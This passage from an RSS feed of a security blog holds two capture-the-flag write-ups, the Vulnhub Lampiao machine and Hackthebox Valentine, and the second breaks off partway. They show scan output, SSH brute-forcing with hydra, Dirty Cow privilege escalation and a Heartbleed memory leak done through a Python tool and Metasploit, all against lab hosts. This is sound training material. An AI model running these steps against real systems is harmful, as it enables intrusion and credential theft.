|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66D00B%P=x86_64-pc-linux-gnu%r(NULL,
SF:1179,&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.002 days (since Sun Aug  5 06:20:07 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 10.0.0.12

NSE: Script Post-scanning.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)s&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yup, now we can see another &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service running on &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache httpd 2.4.7&lt;/code&gt;, port &lt;code class=&quot;highlighter-rouge&quot;&gt;1898&lt;/code&gt;. Website is powered by &lt;code class=&quot;highlighter-rouge&quot;&gt;Drupal 7&lt;/code&gt;, so that’s something to remember too.&lt;/p&gt;

&lt;p&gt;In the main page, I’ve noticed a strange post.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/lampiao/lampiao1.png&quot; alt=&quot;Lampiao1&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that node 2 is not working, so after looking at the url of the first post, we can simply move on to the second one.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Test
Submitted by Eder on Fri, 04/20/2018 - 13:53

audio.m4a
qrc.png

Quite difficult using it. Trying to embed some sound and image... =(&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it’s time to find these files. After trying different directories, looking for default Drupal upload directories, I’ve found it in the main directory of the website.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.12:1898/qrc.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/lampiao/qr.png&quot; alt=&quot;Qr code&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Try harder! muahuahua&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, we have another file called &lt;code class=&quot;highlighter-rouge&quot;&gt;audio.m4a&lt;/code&gt;. Listening to it gives:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;user tiago&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Amazing, we have username! Now it’s time to mess with the password. I could not find it anywhere in the web page, so here we can start with a &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;. As I did not want to run attack with whole &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; wordlist, I decided to check wiht some smaller ones, but with no luck.&lt;/p&gt;

&lt;p&gt;To the rescue came a trick with custom wordlists, learned from &lt;code class=&quot;highlighter-rouge&quot;&gt;Mr. Robot&lt;/code&gt; machine from Vulnhub. Remember &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl&lt;/code&gt;. First node has lots of text, so let’s pack it into a wordlist.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# cewl http://10.0.0.12:1898/?q=node/1 -w pass.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# hydra -l tiago -P pass.txt 192.168.1.112 -t 4 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-07 10:44:21
[DATA] max 4 tasks per 1 server, overall 4 tasks, 835 login tries (l:1/p:835), ~209 tries per task
[DATA] attacking ssh://192.168.1.112:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 771 to do in 00:13h, 4 active
[22][ssh] host: 192.168.1.112   login: tiago   password: Virgulino
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-07 10:46:26&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have it! Unfortunately, even this part took a lot of time as the password is not for Drupal account, but for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and finding that was pure luck.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh tiago@192.168.1.112
The authenticity of host '192.168.1.112 (192.168.1.112)' can't be established.
ECDSA key fingerprint is SHA256:64C0fMfgIRp/7K8EpiEiirq/SrPByxrzXzn7bLIqxbU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.112' (ECDSA) to the list of known hosts.
tiago@192.168.1.112's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Aug  7 11:47:42 BRT 2018

  System load:  0.0               Processes:           167
  Usage of /:   7.6% of 19.07GB   Users logged in:     0
  Memory usage: 27%               IP address for eth0: 192.168.1.112
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Tue Aug  7 11:47:42 2018 from 192.168.1.114

tiago@lampiao:~$ cat .bash_history
su www-data
exit
su root

tiago@lampiao:~$ sudo -l
[sudo] password for tiago: 
Sorry, user tiago may not run sudo on lampiao.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Part for the privilage escalation was quite brutal, as none of the methods did not find anyhting useful, as I do not like using kernel exploits. They are always a last attack, but that was a case in this machine, using version of &lt;code class=&quot;highlighter-rouge&quot;&gt;Dirty Cow&lt;/code&gt; from &lt;a href=&quot;https://www.exploit-db.com/raw/40847/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;tiago@lampiao:/tmp$ touch exploit.c
tiago@lampiao:/tmp$ vi exploit.c 
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exploit exploit.c -lutil
tiago@lampiao:/tmp$ ./exploit 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can log in to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; and find the flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh root@192.168.1.112
root@192.168.1.112's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Aug  7 12:27:04 BRT 2018

  System load:  0.77              Processes:           199
  Usage of /:   7.6% of 19.07GB   Users logged in:     1
  Memory usage: 19%               IP address for eth0: 192.168.1.112
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Fri Apr 20 14:46:57 2018 from 192.168.108.1
root@lampiao:~# ls -la
total 40
drwx------  4 root root 4096 Apr 20 14:46 .
drwxr-xr-x 21 root root 4096 Apr 19 15:55 ..
drwx------  2 root root 4096 Apr 19 16:34 .aptitude
-rw-------  1 root root  254 Aug  7 12:28 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 20 14:46 .cache
-rw-r--r--  1 root root   33 Apr 20 14:41 flag.txt
-rw-------  1 root root  149 Apr 19 16:34 .mysql_history
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root  669 Apr 20 14:45 .viminfo
root@lampiao:~# cat flag.txt 
9740616875908d91ddcdaa8aea3af366&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Still I don’t know if it’s intended solution, but I’m welcome to any suggestions.&lt;/p&gt;
</description>
        <pubDate>Tue, 07 Aug 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-lampiao/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-lampiao/</guid>
      </item>
    
      <item>
        <title>Hackthebox - Valentine</title>
        <description>&lt;p&gt;Today we’re going to walk through the machine from Hackthebox called &lt;strong&gt;&lt;em&gt;Valentine&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Firstly, let’s run a quick &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan to get some open ports.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# nmap 10.10.10.79
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-09 10:48 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.79
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.042s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2.11 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here we can start analyzing &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; services.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# curl 10.10.10.79
&amp;lt;center&amp;gt;&amp;lt;img &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;omg.jpg&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/center&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Both of them show the same image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/valentine/omg.png&quot; alt=&quot;Omg&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s a logo of heartbleed attack! To make sure that the service is vulnerable, we can run another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;--script=ssl-heartbleed&lt;/code&gt; option.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ssl-heartbleed 10.10.10.79
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-09 10:53 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.79
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.038s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the popular OpenSSL cryptographic software library. It allows &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk &lt;span class=&quot;nb&quot;&gt;factor&lt;/span&gt;: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;including 1.0.1f and 1.0.2-beta1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; of OpenSSL are affected by the Heartbleed bug. The bug allows &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;reading memory of systems protected by the vulnerable OpenSSL versions and could allow &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2014-0160

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.06 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I decided to try out two tools - &lt;a href=&quot;https://gist.github.com/eelsivart/10174134&quot;&gt;this&lt;/a&gt; python script exploiting this vulnerability and &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; to try and gather as much information as possible.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;heartbleed.py 
root@kali:~/hackthebox/valentine# vi heartbleed.py 
root@kali:~/hackthebox/valentine# python heartbleed.py 

defribulator v1.16
A tool to &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;and exploit the TLS heartbeat vulnerability aka heartbleed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2014-0160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Usage: heartbleed.py server &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options]

Test and exploit TLS heartbeat vulnerability aka heartbleed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2014-0160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Options:
  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;            show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message and &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; PORT, &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PORT  TCP port to &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default: 443&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; NUM, &lt;span class=&quot;nt&quot;&gt;--num&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NUM     Number of &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;to connect/loop &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default: 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--starttls&lt;/span&gt;        Issue STARTTLS &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SMTP/POP/IMAP/FTP/etc...
  &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; FILEIN, &lt;span class=&quot;nt&quot;&gt;--filein&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;:port
  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--verbose&lt;/span&gt;         Enable verbose output
  &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--hexdump&lt;/span&gt;         Enable hex output
  &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; RAWOUTFILE, &lt;span class=&quot;nt&quot;&gt;--rawoutfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RAWOUTFILE
                        Dump the raw memory contents to a file
  &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ASCIIOUTFILE, &lt;span class=&quot;nt&quot;&gt;--asciioutfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ASCIIOUTFILE
                        Dump the ascii contents to a file
  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--donotdisplay&lt;/span&gt;    Do not display returned data on screen
  &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--extractkey&lt;/span&gt;      Attempt to extract RSA Private Key, will &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;when
                        found. Choosing this enables &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not display
                        returned data on screen.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can use this tool to simply get the leaked data.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# python heartbleed.py 10.10.10.79 

defribulator v1.16
A tool to &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;and exploit the TLS heartbeat vulnerability aka heartbleed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2014-0160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;##################################################################&lt;/span&gt;
Connecting to: 10.10.10.79:443, 1 &lt;span class=&quot;nb&quot;&gt;times
&lt;/span&gt;Sending Client Hello &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;TLSv1.0
Received Server Hello &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
&lt;span class=&quot;c&quot;&gt;##################################################################&lt;/span&gt;

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

&lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;K.Yv...&amp;amp;...&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.l....L&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can see that there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;$text&lt;/code&gt; variable encoded in base64.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
heartbleedbelievethehype&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Some text, let’s save it for later and move to &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; in order to use their scanner.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/hackthebox/valentine# msfconsole

msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/ssl/openssl_heartbleed
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name              Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;              &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   MAX_KEYTRIES      50               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Max tries to dump key
   RESPONSE_TIMEOUT  10               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Number of seconds to &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a server response
   RHOSTS                             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
   RPORT             443              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   STATUS_EVERY      5                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;How many retries &lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;status
   THREADS           1                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of concurrent threads
   TLS_CALLBACK      None             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Protocol to use, &lt;span class=&quot;s2&quot;&gt;&quot;None&quot;&lt;/span&gt; to use raw TLS sockets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   TLS_VERSION       1.0              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;TLS/SSL version to use &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: SSLv3, 1.0, 1.1, 1.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Auxiliary action:

   Name  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   SCAN  Check hosts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;vulnerability


msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.79
RHOSTS &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.10.79
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;MAX_KEYTRIES 20000
MAX_KEYTRIES &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 20000
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show actions

Auxiliary actions:

   Name  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   DUMP  Dump memory contents
   KEYS  Recover private keys from memory
   SCAN  Check hosts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;vulnerability


msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;ACTION KEYS
ACTION &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; KEYS
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/ssl/openssl_heartbleed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - Scanning &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;private keys
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - Getting public key constants...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.79:443       - 2018-07-09 17:07:42 UTC - Starting.
